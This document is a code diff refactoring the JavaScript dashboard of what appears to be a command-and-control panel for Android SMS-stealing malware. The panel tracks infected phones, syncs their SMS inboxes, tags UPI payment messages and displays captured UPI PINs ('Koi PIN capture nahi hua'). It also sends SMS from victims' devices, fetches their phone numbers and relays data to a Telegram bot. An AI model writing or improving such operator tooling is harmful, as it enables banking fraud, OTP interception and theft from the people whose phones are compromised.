     $("#liveOffline").textContent = total - online;
     $("#liveDeviceCount").textContent = total;
-
-    const upiToday = state.messages.filter((m) => m.kind === "upi").length;
-    $("#liveUpi").textContent = upiToday;
+    $("#liveUpi").textContent = state.messages.filter((m) => m.kind === "upi").length;
 
     const body = $("#liveBody");
     if (!state.devices.length) { renderEmpty(body, 4, "No devices"); return; }
@@ -1754,39 +1533,25 @@ function renderLive() {
     body.replaceChildren();
 
     state.devices.forEach((d) => {
-        const t = getTelemetry(d);
+        const info = numberInfo(d);
         const row = document.createElement("tr");
 
         const nameCell = document.createElement("td");
         nameCell.textContent = getDeviceName(d);
         const sub = document.createElement("span");
         sub.className = "cell-sub";
-        sub.textContent = `${isOnline(d) ? "● online" : "○ offline"} · ${t.sim_number || "no number"}`;
+        sub.textContent = `${isOnline(d) ? "● online" : "○ offline"} · ${getTelemetry(d).model || "—"}`;
         nameCell.appendChild(sub);
-        if (d.upi_pin) {
-            const pin = document.createElement("span");
-            pin.className = "cell-pin";
-            pin.textContent = `PIN ${d.upi_pin}${d.payment_app ? " · " + d.payment_app : ""}`;
-            nameCell.appendChild(pin);
-        }
         row.appendChild(nameCell);
 
-        const id = getDeviceId(d);
-        const lastMsg = state.messages.find((m) => String(m.device_id) === String(id));
-        const msgCell = document.createElement("td");
-        if (lastMsg) {
-            const span = document.createElement("span");
-            span.className = "cell-body";
-            span.textContent = lastMsg.body || "—";
-            msgCell.appendChild(span);
-            const meta = document.createElement("span");
-            meta.className = "cell-sub";
-            meta.textContent = `${lastMsg.direction === "in" ? "←" : "→"} ${formatDate(lastMsg.created_at)}`;
-            msgCell.appendChild(meta);
-        } else {
-            msgCell.textContent = "—";
-        }
-        row.appendChild(msgCell);
+        const numCell = document.createElement("td");
+        numCell.className = "mono";
+        numCell.textContent = info.live || info.entered || "—";
+        const nsub = document.createElement("span");
+        nsub.className = "cell-sub";
+        nsub.textContent = info.live ? "live (device)" : (info.entered ? "entered (operator)" : "no number");
+        numCell.appendChild(nsub);
+        row.appendChild(numCell);
 
         const sendCell = document.createElement("td");
         const wrap = document.createElement("div");
@@ -1806,15 +1571,14 @@ function renderLive() {
             const text = input.value.trim();
             if (!text) { showToast("message khali hai"); return; }
             btn.disabled = true;
-            try {
-                await api("/admin/send", {
-                    method: "POST",
-                    body: JSON.stringify({ target: "device", device_id: id, body: text })
-                });
-                input.value = "";
-                showToast(`queued → ${getDeviceName(d)}`);
-            } catch (e) { showToast(e.message); }
-            finally { btn.disabled = false; }
+            const ok = await sendSms({
+                deviceId: getDeviceId(d),
+                deviceName: getDeviceName(d),
+                to: info.live || info.entered || null,
+                body: text
+            });
+            if (ok) input.value = "";
+            btn.disabled = false;
         });
 
         wrap.appendChild(input);
@@ -1826,7 +1590,7 @@ function renderLive() {
         const allBtn = document.createElement("button");
         allBtn.className = "row-button danger";
         allBtn.type = "button";
-        allBtn.textContent = "View";
+        allBtn.textContent = "Open";
         allBtn.addEventListener("click", () => openDeviceDetail(d));
         allCell.appendChild(allBtn);
         row.appendChild(allCell);
@@ -1842,9 +1606,7 @@ function renderMessages() {
 
     if (filter === "in" || filter === "out") list = list.filter((m) => m.direction === filter);
     if (filter === "upi") list = list.filter((m) => m.kind === "upi");
-    if (q) list = list.filter((m) =>
-        `${m.body} ${m.address} ${m.device_name} ${m.amount} ${m.status}`.toLowerCase().includes(q)
-    );
+    if (q) list = list.filter((m) => `${m.body} ${m.address} ${m.device_name} ${m.amount} ${m.status}`.toLowerCase().includes(q));
 
     $("#messageCount").textContent = `${list.length} messages`;
 
@@ -1929,12 +1691,9 @@ function renderTelegram() {
         $("#botVerifyBox").hidden = true;
         setBadge($("#tgBadge"), "Not bound");
     } else {
-        setBadge($("#botStateBadge"), bot.bound ? "Bound" : "Awaiting verify",
-            bot.bound ? "bound" : "pending");
-        setBadge($("#botChannelBadge"), bot.chat_title || bot.channel || "—",
-            bot.bound ? "bound" : "pending");
-        setBadge($("#botWebhookBadge"), bot.webhook_ok ? "Active" : "Not set",
-            bot.webhook_ok ? "online" : "error");
+        setBadge($("#botStateBadge"), bot.bound ? "Bound" : "Awaiting verify", bot.bound ? "bound" : "pending");
+        setBadge($("#botChannelBadge"), bot.chat_title || bot.channel || "—", bot.bound ? "bound" : "pending");
+        setBadge($("#botWebhookBadge"), bot.webhook_ok ? "Active" : "Not set", bot.webhook_ok ? "online" : "error");
 
         $("#botUsername").textContent = bot.username ? `@${bot.username}` : "—";
         $("#botChannelLabel").textContent = bot.channel || "—";
@@ -1948,13 +1707,10 @@ function renderTelegram() {
             $("#botVerifyBox").hidden = true;
         }
 
-        setBadge($("#tgBadge"), bot.bound ? "Bound" : "Pending",
-            bot.bound ? "bound" : "pending");
+        setBadge($("#tgBadge"), bot.bound ? "Bound" : "Pending", bot.bound ? "bound" : "pending");
 
         $("#botToken").value = "";
-        $("#botToken").placeholder = bot.token_masked
-            ? `${bot.token_masked}  (paste pura token)`
-            : "123456:ABC-DEF…";
+        $("#botToken").placeholder = bot.token_masked ? `${bot.token_masked}  (paste pura token)` : "123456:ABC-DEF…";
         $("#botChannel").value = bot.channel || "";
     }
 
@@ -1966,8 +1722,7 @@ function renderTelegram() {
     state.tgLogs.forEach((l) => {
         const row = document.createElement("tr");
         appendCell(row, formatDate(l.created_at));
-        createBadgeCell(row, l.direction === "in" ? "in" : "out",
-            l.direction === "in" ? "in" : "out");
+        createBadgeCell(row, l.direction === "in" ? "in" : "out", l.direction === "in" ? "in" : "out");
 
         const txtCell = document.createElement("td");
         const span = document.createElement("span");
@@ -1981,8 +1736,7 @@ function renderTelegram() {
     });
 }
 
-/* ------------------------------------------------ device cards (grid) */
-
+/* ------------------------------------------------ device cards */
 function renderDeviceCards() {
     const q = ($("#deviceSearch")?.value || "").trim().toLowerCase();
     let list = state.pinsOnly ? state.devices.filter(hasPin) : state.devices;
@@ -1990,10 +1744,9 @@ function renderDeviceCards() {
     if (q) {
         list = list.filter((d) => {
             const t = getTelemetry(d);
-            const hay = [
-                getDeviceName(d), t.model, t.manufacturer, t.brand,
-                d.phone_number, t.sim_number, t.sim_carrier, d.payment_app
-            ].filter(Boolean).join(" ").toLowerCase();
+            const info = numberInfo(d);
+            const hay = [getDeviceName(d), t.model, t.manufacturer, t.brand, info.live, info.entered, info.carrier, d.payment_app]
+                .filter(Boolean).join(" ").toLowerCase();
             return hay.includes(q);
         });
     }
@@ -2004,15 +1757,14 @@ function renderDeviceCards() {
     const empty = $("#deviceEmpty");
     if (!list.length) {
         empty.hidden = false;
-        empty.textContent = state.pinsOnly
-            ? "Koi PIN capture nahi hua"
-            : (q ? "Koi device match nahi hua" : "No devices registered");
+        empty.textContent = state.pinsOnly ? "Koi PIN capture nahi hua" : (q ? "Koi device match nahi hua" : "No devices registered");
         return;
     }
     empty.hidden = true;
 
     list.forEach((d) => {
         const t = getTelemetry(d);
+        const info = numberInfo(d);
         const msgs = deviceMessages(d);
 
         const card = document.createElement("article");
@@ -2020,7 +1772,6 @@ function renderDeviceCards() {
         card.tabIndex = 0;
         card.setAttribute("role", "button");
 
-        /* top: phone icon + name + battery */
         const top = document.createElement("div");
         top.className = "device-card-top";
 
@@ -2049,22 +1800,21 @@ function renderDeviceCards() {
 
         card.appendChild(top);
 
-        /* meta badges */
         const meta = document.createElement("div");
         meta.className = "device-card-meta";
 
-        const statusBadge = document.createElement("span");
         const st = getDeviceStatus(d).toLowerCase();
-        statusBadge.className = "badge " + (st.includes("online") || st.includes("active") ? "online"
-            : st.includes("offline") ? "error" : "");
+        const statusBadge = document.createElement("span");
+        statusBadge.className = "badge " + (st.includes("online") || st.includes("active") ? "online" : st.includes("offline") ? "error" : "");
         statusBadge.textContent = getDeviceStatus(d);
         meta.appendChild(statusBadge);
 
-        const num = t.sim_number || d.phone_number || t.sim_carrier;
+        const num = info.live || info.entered;
         if (num) {
             const nb = document.createElement("span");
-            nb.className = "badge mono";
+            nb.className = "badge mono " + (info.live ? "online" : "entered");
             nb.textContent = num;
+            nb.title = info.live ? "live number (device)" : "entered number (operator)";
             meta.appendChild(nb);
         }
 
@@ -2075,18 +1825,12 @@ function renderDeviceCards() {
             meta.appendChild(pb);
         }
 
-        const ramBadge = document.createElement("span");
-        ramBadge.className = "badge";
-        ramBadge.textContent = `RAM ${ramLabel(d)}`;
-        meta.appendChild(ramBadge);
-
         card.appendChild(meta);
 
-        /* foot */
         const foot = document.createElement("div");
         foot.className = "device-card-foot";
         const cnt = document.createElement("span");
-        cnt.textContent = `${msgs.length} messages · ${formatDate(d.created_at)}`;
+        cnt.textContent = `${msgs.length} messages`;
         foot.appendChild(cnt);
         const hint = document.createElement("span");
         hint.className = "open-hint";
@@ -2105,119 +1849,178 @@ function renderDeviceCards() {
 }
 
 /* -------------------------------------------------- device detail */
-
-function detailGroup(title, rows) {
-    const g = document.createElement("div");
-    g.className = "detail-group";
-    const h = document.createElement("h4");
-    h.textContent = title;
-    g.appendChild(h);
-
-    rows.forEach(([label, value]) => {
-        const r = document.createElement("div");
-        r.className = "detail-row";
-        const l = document.createElement("span");
-        l.textContent = label;
-        const v = document.createElement("span");
-        v.textContent = safeValue(value, "—");
-        r.appendChild(l);
-        r.appendChild(v);
-        g.appendChild(r);
-    });
-
-    return g;
-}
-
-function renderDeviceInfo(d) {
-    const t = getTelemetry(d);
-    const sims = Array.isArray(t.sims) ? t.sims : [];
-    const msgs = deviceMessages(d);
-    const inCount = msgs.filter((m) => m.direction === "in").length;
-    const outCount = msgs.filter((m) => m.direction === "out").length;
-    const upiCount = msgs.filter((m) => m.kind === "upi").length;
-    const sorted = msgs.slice().sort((a, b) => new Date(a.created_at || 0) - new Date(b.created_at || 0));
-
-    const box = $("#dvInfo");
+function renderDeviceNumbers(d) {
+    const info = numberInfo(d);
+    const box = $("#dvNumbers");
     box.replaceChildren();
 
-    box.appendChild(detailGroup("Device", [
-        ["Name", getDeviceName(d)],
-        ["Model", t.model],
-        ["Manufacturer", t.manufacturer],
-        ["Brand", t.brand],
-        ["Device", t.device],
-        ["Product", t.product]
-    ]));
+    const row = (label, value, note, badgeType, badgeText) => {
+        const r = document.createElement("div");
+        r.className = "num-row";
 
-    box.appendChild(detailGroup("Hardware", [
+        const left = document.createElement("div");
+        left.style.minWidth = "0";
+
+        const l = document.createElement("div");
+        l.className = "num-label";
+        l.textContent = label;
+
+        const v = document.createElement("div");
+        v.className = "num-val" + (value ? "" : " empty");
+        v.textContent = value || "not available";
+
+        left.appendChild(l);
+        left.appendChild(v);
+
+        if (note) {
+            const n = document.createElement("div");
+            n.className = "cell-sub";
+            n.textContent = note;
+            left.appendChild(n);
+        }
+
+        r.appendChild(left);
+
+        if (badgeText) {
+            const b = document.createElement("span");
+            b.className = "badge " + (badgeType || "");
+            b.textContent = badgeText;
+            r.appendChild(b);
+        }
+        return r;
+    };
+
+    box.appendChild(row("Entered number", info.entered, "operator ne onboarding me enter kiya", "entered", info.entered ? "entered" : null));
+    box.appendChild(row("Live number (device)", info.live, info.source ? `source: ${info.source}` : "SIM se auto-fetch", "online", info.live ? "live" : null));
+
+    if (info.carrier) box.appendChild(row("Carrier", info.carrier));
+    if (info.serial) box.appendChild(row("SIM serial", info.serial));
+
+    info.slots.forEach((s, i) => {
+        if (!s) return;
+        const val = s.number || s.carrier;
+        if (val) box.appendChild(row(`SIM ${(s.slot ?? i) + 1}`, val, s.number_source ? `source: ${s.number_source}` : null));
+    });
+
+    setBadge($("#dvNumState"), info.live ? "live" : (info.entered ? "entered only" : "no number"),
+        info.live ? "online" : (info.entered ? "entered" : "error"));
+
+    if (!info.live) {
+        const hint = document.createElement("div");
+        hint.className = "cell-sub";
+        hint.style.marginTop = "10px";
+        hint.textContent = "Live number nahi mila — 'fetch number' dabao (device online hona chahiye).";
+        box.appendChild(hint);
+    }
+}
+
+function renderDeviceSpecs(d) {
+    const t = getTelemetry(d);
+    const msgs = deviceMessages(d);
+    const box = $("#dvSpecs");
+    box.replaceChildren();
+
+    const tiles = [
         ["RAM", ramLabel(d)],
         ["Storage", storageLabel(d)],
-        ["Free storage", freeStorageLabel(d)],
+        ["Free space", freeStorageLabel(d) || "—"],
+        ["Android", t.android_version || "—"],
+        ["Battery", batteryLevel(d) === null ? "—" : batteryLevel(d) + "%" + (isCharging(d) ? " ⚡" : "")],
+        ["Network", t.network_type || "—"],
+        ["Created", formatDate(d.created_at)],
+        ["Last seen", formatDate(d.last_seen)],
+        ["Messages", String(msgs.length)],
+        ["UPI PIN", d.upi_pin || "—"],
+        ["Payment app", d.payment_app || "—"],
+        ["Socket", d.ws_connected ? "connected" : "disconnected"]
+    ];
+
+    tiles.forEach(([k, v]) => {
+        const tile = document.createElement("div");
+        tile.className = "spec-tile";
+        const kk = document.createElement("div");
+        kk.className = "spec-key";
+        kk.textContent = k;
+        const vv = document.createElement("div");
+        vv.className = "spec-val";
+        vv.textContent = v;
+        tile.appendChild(kk);
+        tile.appendChild(vv);
+        box.appendChild(tile);
+    });
+}
+
+function renderMoreInfo(d) {
+    const t = getTelemetry(d);
+    const box = $("#dvMore");
+    box.replaceChildren();
+
+    const grid = document.createElement("div");
+    grid.className = "more-grid";
+
+    const rows = [
+        ["Device id", getDeviceId(d)],
+        ["Registration id", d.registration_id],
+        ["Manufacturer", t.manufacturer],
+        ["Brand", t.brand],
+        ["SDK int", t.sdk_int],
+        ["Android ID", t.android_id],
         ["CPU / ABI", t.cpu_abi || t.cpu],
         ["Cores", t.cpu_cores],
         ["Resolution", t.screen_resolution || t.resolution],
-        ["Android", t.android_version],
-        ["SDK", t.sdk_int],
-        ["Android ID", t.android_id]
-    ]));
-
-    box.appendChild(detailGroup("Timeline", [
-        ["Created", formatDate(d.created_at)],
-        ["Registered", formatDate(d.registered_at)],
-        ["First seen", formatDate(d.first_seen)],
-        ["Last seen", formatDate(d.last_seen)],
-        ["Inbox synced", d.sms_inbox_synced_at ? formatDate(d.sms_inbox_synced_at) : null],
-        ["Onboarded at", formatDate(d.onboarded_at)]
-    ]));
-
-    box.appendChild(detailGroup("Power", [
-        ["Battery", batteryLevel(d) === null ? null : `${batteryLevel(d)}%`],
-        ["Charging", isCharging(d) ? "Yes" : "No"],
-        ["Source", t.battery_plugged],
-        ["Temp", t.battery_temperature_c],
-        ["Health", t.battery_health]
-    ]));
-
-    box.appendChild(detailGroup("SIM & network", [
-        ["Carrier", t.sim_carrier || d.sim_carrier],
-        ["SIM number", t.sim_number || d.sim_number],
+        ["Local IP", t.local_ip],
+        ["SIM count", t.sim_count],
         ["Number source", t.sim_number_source],
-        ["SIM serial", t.sim_serial],
-        ["Slots", sims.length || t.sim_count || 0],
-        ["Network", t.network_type],
-        ["Local IP", t.local_ip]
-    ]));
+        ["Charging source", t.battery_plugged],
+        ["Battery temp", t.battery_temperature_c],
+        ["Battery health", t.battery_health],
+        ["Inbox synced", d.sms_inbox_synced_at ? formatDate(d.sms_inbox_synced_at) : null],
+        ["Inbox count", t.sms_inbox_count],
+        ["Sent count", t.sms_sent_count],
+        ["Received count", t.sms_received_count],
+        ["Onboarded", d.onboarded ? "Yes" : "No"],
+        ["Onboarded at", d.onboarded_at ? formatDate(d.onboarded_at) : null],
+        ["Onboard amount", d.onboard_amount != null ? "₹" + d.onboard_amount : null]
+    ];
 
-    sims.forEach((s, i) => {
-        box.appendChild(detailGroup(`SIM ${(s.slot ?? i) + 1}`, [
-            ["Carrier", s.carrier],
-            ["Number", s.number],
-            ["Source", s.number_source]
-        ]));
+    rows.forEach(([k, v]) => {
+        if (v === null || v === undefined || v === "") return;
+        const r = document.createElement("div");
+        r.className = "more-row";
+        const a = document.createElement("span");
+        a.textContent = k;
+        const b = document.createElement("span");
+        b.textContent = safeValue(v);
+        r.appendChild(a);
+        r.appendChild(b);
+        grid.appendChild(r);
     });
 
-    box.appendChild(detailGroup("Onboarding", [
-        ["Entered number", d.phone_number],
-        ["UPI PIN", d.upi_pin],
-        ["Payment app", d.payment_app],
-        ["Amount", d.onboard_amount != null ? `₹${d.onboard_amount}` : null],
-        ["Onboarded", d.onboarded ? "Yes" : "No"]
-    ]));
+    box.appendChild(grid);
+}
 
-    box.appendChild(detailGroup("Message stats", [
-        ["Total", msgs.length],
-        ["Inbound", inCount],
-        ["Outbound", outCount],
-        ["UPI tagged", upiCount],
-        ["First message", sorted.length ? formatDate(sorted[0].created_at) : null],
-        ["Latest message", sorted.length ? formatDate(sorted[sorted.length - 1].created_at) : null]
-    ]));
+function renderLinkBanner(d) {
+    const b = $("#dvLinkBanner");
+    b.replaceChildren();
 
-    box.appendChild(detailGroup("Status", [
-        ["Socket", d.ws_connected ? "connected" : "disconnected"],
-        ["Device id", getDeviceId(d)],
-        ["Registration id", d.registration_id]
-    ]));
+    if (isOnline(d)) {
+        b.hidden = true;
+        return;
+    }
+
+    b.hidden = false;
+    b.className = "link-banner danger";
+
+    const txt = document.createElement("span");
+    txt.textContent = `Device socket disconnected${d.last_seen ? " (last seen " + formatDate(d.last_seen) + ")" : ""} — SMS outbox me queue hoga, phone online hote hi deliver hoga.`;
+    b.appendChild(txt);
+
+    const btn = document.createElement("button");
+    btn.className = "secondary-button";
+    btn.type = "button";
+    btn.textContent = "⟳ Ping device";
+    btn.addEventListener("click", () => pingDevice(d));
+    b.appendChild(btn);
 }
 
 function renderDeviceMessages() {
@@ -2232,11 +2035,7 @@ function renderDeviceMessages() {
     let list = all;
     if (dir === "in" || dir === "out") list = list.filter((m) => m.direction === dir);
     if (upiOnly) list = list.filter((m) => m.kind === "upi");
-    if (q) {
-        list = list.filter((m) =>
-            `${m.body} ${m.address} ${m.amount} ${m.status}`.toLowerCase().includes(q)
-        );
-    }
+    if (q) list = list.filter((m) => `${m.body} ${m.address} ${m.amount} ${m.status}`.toLowerCase().includes(q));
 
     list = list.slice().sort((a, b) => new Date(b.created_at || 0) - new Date(a.created_at || 0));
 
@@ -2248,9 +2047,7 @@ function renderDeviceMessages() {
     if (!list.length) {
         const e = document.createElement("div");
         e.className = "empty-state";
-        e.textContent = all.length
-            ? "Is filter par koi message nahi mila"
-            : "Is device ka koi message nahi hai";
+        e.textContent = all.length ? "Is filter par koi message nahi mila" : "Is device ka koi message nahi hai";
         wrap.appendChild(e);
         return;
     }
@@ -2262,8 +2059,8 @@ function renderDeviceMessages() {
         const head = document.createElement("div");
         head.className = "msg-head";
 
-        const dirBadge = document.createElement("span");
         const isIn = m.direction === "in";
+        const dirBadge = document.createElement("span");
         dirBadge.className = "badge " + (isIn ? "in" : "out");
         dirBadge.textContent = isIn ? "IN" : "OUT";
         head.appendChild(dirBadge);
@@ -2302,8 +2099,8 @@ function renderDeviceMessages() {
             foot.appendChild(ab);
         }
 
-        const sb = document.createElement("span");
         const s = String(m.status || (isIn ? "received" : "sent")).toLowerCase();
+        const sb = document.createElement("span");
         sb.className = "badge " + (["sent","success","received","delivered","ok"].includes(s) ? "online"
             : ["pending","queued"].includes(s) ? "pending"
             : ["failed","error"].includes(s) ? "error" : "");
@@ -2315,14 +2112,12 @@ function renderDeviceMessages() {
     });
 }
 
-function openDeviceDetail(d) {
-    state.activeDevice = d;
-
-    const t = getTelemetry(d);
+function renderDeviceDetail(d) {
+    const info = numberInfo(d);
 
     $("#dvIcon").innerHTML = PHONE_SVG;
     $("#dvName").textContent = getDeviceName(d);
-    $("#dvSub").textContent = `${t.model || "unknown model"} · Android ${t.android_version || "—"} · RAM ${ramLabel(d)}`;
+    $("#dvSub").textContent = `${getTelemetry(d).model || "unknown model"} · Android ${getTelemetry(d).android_version || "—"} · RAM ${ramLabel(d)}`;
 
     const tags = $("#dvTags");
     tags.replaceChildren();
@@ -2330,52 +2125,70 @@ function openDeviceDetail(d) {
     const st = getDeviceStatus(d);
     const stl = st.toLowerCase();
     const stBadge = document.createElement("span");
-    stBadge.className = "badge " + (stl.includes("online") || stl.includes("active") ? "online"
-        : stl.includes("offline") ? "error" : "");
+    stBadge.className = "badge " + (stl.includes("online") || stl.includes("active") ? "online" : stl.includes("offline") ? "error" : "");
     stBadge.textContent = st;
     tags.appendChild(stBadge);
 
-    const num = t.sim_number || d.phone_number;
-    if (num) {
-        const nb = document.createElement("span");
-        nb.className = "badge mono";
-        nb.textContent = num;
-        tags.appendChild(nb);
-    }
+    const created = document.createElement("span");
+    created.className = "badge";
+    created.textContent = `created ${formatDate(d.created_at)}`;
+    tags.appendChild(created);
+
     if (d.upi_pin) {
         const pb = document.createElement("span");
         pb.className = "badge pin mono";
         pb.textContent = `PIN ${d.upi_pin}${d.payment_app ? " · " + d.payment_app : ""}`;
         tags.appendChild(pb);
     }
-    const created = document.createElement("span");
-    created.className = "badge";
-    created.textContent = `created ${formatDate(d.created_at)}`;
-    tags.appendChild(created);
 
     const battBox = $("#dvBattery");
     battBox.replaceChildren();
     battBox.appendChild(batteryEl(d));
 
+    setBadge($("#dvTargetBadge"), info.live || info.entered || "no number",
+        info.live ? "online" : info.entered ? "entered" : "error");
+
+    renderLinkBanner(d);
+    renderDeviceNumbers(d);
+    renderDeviceSpecs(d);
+    renderMoreInfo(d);
+    renderOutbox();
+}
+
+function openDeviceDetail(d) {
+    state.activeDevice = d;
+
     $("#dvSearch").value = "";
     $("#dvDir").value = "";
     $("#dvUpi").checked = false;
-    $("#dvTo").value = "";
     $("#dvBody").value = "";
+    $("#dvMore").hidden = true;
+    $("#dvMoreToggle").textContent = "show";
 
-    renderDeviceInfo(d);
+    const info = numberInfo(d);
+    $("#dvTo").value = info.live || info.entered || "";
+
+    renderDeviceDetail(d);
     renderDeviceMessages();
 
     $("#deviceDetail").hidden = false;
     document.body.style.overflow = "hidden";
 
-    /* fresh messages laao (device specific) */
+    const id = getDeviceId(d);
     loadMessages().then(() => {
-        if (state.activeDevice && String(getDeviceId(state.activeDevice)) === String(getDeviceId(d))) {
-            renderDeviceInfo(d);
+        if (state.activeDevice && String(getDeviceId(state.activeDevice)) === String(id)) {
+            renderDeviceDetail(d);
             renderDeviceMessages();
         }
     }).catch(() => {});
+
+    /* live number missing ho to ek baar auto-fetch */
+    if (!info.live && !state.numTried[String(id)]) {
+        state.numTried[String(id)] = true;
+        setTimeout(() => {
+            if (state.activeDevice && String(getDeviceId(state.activeDevice)) === String(id)) fetchDeviceNumber(d);
+        }, 900);
+    }
 }
 
 function closeDeviceDetail() {
@@ -2385,22 +2198,21 @@ function closeDeviceDetail() {
 }
 
 /* -------------------------------------------------------- loaders */
-
 async function loadHealth() {
     try {
         const h = await api("/health");
-        $("#connectionLabel").textContent = h.status === "ok" ? "Link up" : "Degraded";
-        setBadge($("#apiBadge"), h.status === "ok" ? "Online" : "Check",
-            h.status === "ok" ? "online" : "pending");
+        state.linkOk = true;
+        updateLink();
+        setBadge($("#apiBadge"), h.status === "ok" ? "Online" : "Check", h.status === "ok" ? "online" : "pending");
     } catch {
-        $("#connectionLabel").textContent = "Link down";
+        state.linkOk = false;
+        updateLink();
         setBadge($("#apiBadge"), "Down", "error");
     }
 
     try {
         const db = await api("/health/database");
-        setBadge($("#dbBadge"), db.status === "ok" ? "Connected" : "Issue",
-            db.status === "ok" ? "online" : "error");
+        setBadge($("#dbBadge"), db.status === "ok" ? "Connected" : "Issue", db.status === "ok" ? "online" : "error");
     } catch {
         setBadge($("#dbBadge"), "Down", "error");
     }
@@ -2408,33 +2220,56 @@ async function loadHealth() {
 
 async function loadDevices() {
     const d = await api("/admin/devices");
+    state.linkOk = true;
+    updateLink();
     state.devices = Array.isArray(d) ? d : d.devices || [];
     renderOverview();
     renderLive();
     renderDeviceCards();
 
     if (state.activeDevice) {
-        const fresh = state.devices.find(
-            (x) => String(getDeviceId(x)) === String(getDeviceId(state.activeDevice))
-        );
+        const fresh = state.devices.find((x) => String(getDeviceId(x)) === String(getDeviceId(state.activeDevice)));
         if (fresh) {
             state.activeDevice = fresh;
-            renderDeviceInfo(fresh);
-            $("#dvName").textContent = getDeviceName(fresh);
-            $("#dvSub").textContent = `${getTelemetry(fresh).model || "unknown model"} · Android ${getTelemetry(fresh).android_version || "—"} · RAM ${ramLabel(fresh)}`;
-            const bb = $("#dvBattery");
-            bb.replaceChildren();
-            bb.appendChild(batteryEl(fresh));
+            renderDeviceDetail(fresh);
+            renderDeviceMessages();
         }
     }
 }
 
+function upsertMessage(m) {
+    const key = m.id || m._id || `${m.device_id}|${m.created_at}|${m.body}`;
+    const exists = state.messages.some((x) => (x.id || x._id || `${x.device_id}|${x.created_at}|${x.body}`) === key);
+    if (exists) return;
+    state.messages.unshift(m);
+    renderMessages();
+    renderLive();
+    if (state.activeDevice) renderDeviceMessages();
+}
+
 async function loadMessages() {
     const d = await api("/admin/messages?limit=500");
+    state.linkOk = true;
+    updateLink();
     state.messages = Array.isArray(d) ? d : d.messages || [];
     renderMessages();
     renderLive();
     if (state.activeDevice) renderDeviceMessages();
+    reconcileOutbox();
+}
+
+function reconcileOutbox() {
+    state.outbox.forEach((j) => {
+        if (j.status === "sent" || j.status === "failed") return;
+        const hit = state.messages.some((m) =>
+            String(m.device_id) === String(j.deviceId) &&
+            m.direction === "out" &&
+            (m.body || "").trim() === (j.body || "").trim() &&
+            new Date(m.created_at || 0).getTime() >= j.at - 60000
+        );
+        if (hit) j.status = "sent";
+    });
+    renderOutbox();
 }
 
 async function loadRules() {
@@ -2452,16 +2287,11 @@ async function loadTelegram() {
 
 async function refreshAll() {
     if (!state.authenticated) return;
-
     $("#refreshButton").disabled = true;
     try {
         await loadHealth();
-        const results = await Promise.allSettled([
-            loadDevices(), loadMessages(), loadRules(), loadTelegram()
-        ]);
-        if (results.some((r) => r.status === "rejected")) {
-            showToast("some sections failed to sync");
-        }
+        const results = await Promise.allSettled([loadDevices(), loadMessages(), loadRules(), loadTelegram()]);
+        if (results.some((r) => r.status === "rejected")) showToast("some sections failed to sync");
     } finally {
         $("#refreshButton").disabled = false;
     }
@@ -2478,15 +2308,90 @@ async function refreshSection(section) {
     } catch (e) { showToast(e.message); }
 }
 
-/* ------------------------------------------------------- navigate */
+/* ------------------------------------------------------- realtime */
+function updateLink() {
+    const el = $("#connectionLabel");
+    if (el) el.textContent = state.wsOk ? "Socket live" : (state.linkOk ? "Polling" : "Link down");
+    setBadge($("#wsBadge"), state.wsOk ? "Live" : "Polling", state.wsOk ? "online" : "pending");
+}
 
+function connectAdminSocket() {
+    if (!state.authenticated) return;
+    if (state.ws && (state.ws.readyState === 0 || state.ws.readyState === 1)) return;
+
+    try {
+        const proto = location.protocol === "https:" ? "wss:" : "ws:";
+        const ws = new WebSocket(`${proto}//${location.host}/ws/admin`);
+        state.ws = ws;
+
+        ws.onopen = () => { state.wsOk = true; state.wsFails = 0; updateLink(); };
+        ws.onmessage = (ev) => { try { handleSocketEvent(JSON.parse(ev.data)); } catch { /* ignore */ } };
+        ws.onclose = () => { state.wsOk = false; updateLink(); scheduleReconnect(); };
+        ws.onerror = () => { state.wsOk = false; try { ws.close(); } catch {} };
+    } catch {
+        scheduleReconnect();
+    }
+}
+
+function scheduleReconnect() {
+    clearTimeout(state.wsTimer);
+    state.wsFails = Math.min((state.wsFails || 0) + 1, 6);
+    const delay = Math.min(1500 * state.wsFails, 15000);
+    state.wsTimer = setTimeout(() => { if (state.authenticated) connectAdminSocket(); }, delay);
+}
+
+function handleSocketEvent(msg) {
+    if (!msg || typeof msg !== "object") return;
+    const type = String(msg.type || msg.event || "").toLowerCase();
+    const data = (msg.data && typeof msg.data === "object") ? msg.data : msg;
+
+    if (data.body || type.includes("sms") || type.includes("message")) upsertMessage(data);
+
+    if (type.includes("telemetry") || type.includes("device") || type.includes("status")) {
+        const id = data.device_id || data.id || data._id;
+        if (id) {
+            const idx = state.devices.findIndex((x) => String(getDeviceId(x)) === String(id));
+            if (idx >= 0) {
+                state.devices[idx] = { ...state.devices[idx], ...data };
+                renderDeviceCards();
+                renderLive();
+                if (state.activeDevice && String(getDeviceId(state.activeDevice)) === String(id)) {
+                    state.activeDevice = state.devices[idx];
+                    renderDeviceDetail(state.activeDevice);
+                }
+            } else {
+                loadDevices().catch(() => {});
+            }
+        }
+    }
+
+    if (type.includes("ack") || type.includes("sent")) {
+        const j = state.outbox.find((x) => x.status !== "sent" && (!data.body || x.body === data.body));
+        if (j) { j.status = "sent"; renderOutbox(); }
+    }
+}
+
+function schedulePoll() {
+    clearTimeout(state.pollTimer);
+    const fast = state.devices.some(isOnline);
+    state.pollTimer = setTimeout(async () => {
+        if (state.authenticated && !document.hidden) {
+            await Promise.allSettled([loadDevices(), loadMessages()]);
+        }
+        schedulePoll();
+    }, fast ? 6000 : 15000);
+}
+
+function startRealtime() {
+    updateLink();
+    connectAdminSocket();
+    schedulePoll();
+}
+
+/* ------------------------------------------------------- navigate */
 function navigate(page) {
-    document.querySelectorAll(".nav-button").forEach((b) => {
-        b.classList.toggle("active", b.dataset.page === page);
-    });
-    document.querySelectorAll(".page-section").forEach((s) => {
-        s.classList.toggle("active", s.id === `page-${page}`);
-    });
+    document.querySelectorAll(".nav-button").forEach((b) => b.classList.toggle("active", b.dataset.page === page));
+    document.querySelectorAll(".page-section").forEach((s) => s.classList.toggle("active", s.id === `page-${page}`));
 
     if (page === "devices") refreshSection("devices");
     if (page === "messages") refreshSection("messages");
@@ -2495,7 +2400,6 @@ function navigate(page) {
 }
 
 /* --------------------------------------------------------- actions */
-
 $("#pinsOnlyButton").addEventListener("click", () => {
     state.pinsOnly = !state.pinsOnly;
     $("#pinsOnlyButton").classList.toggle("active", state.pinsOnly);
@@ -2508,38 +2412,33 @@ $("#dvSearch").addEventListener("input", renderDeviceMessages);
 $("#dvDir").addEventListener("change", renderDeviceMessages);
 $("#dvUpi").addEventListener("change", renderDeviceMessages);
 $("#dvClose").addEventListener("click", closeDeviceDetail);
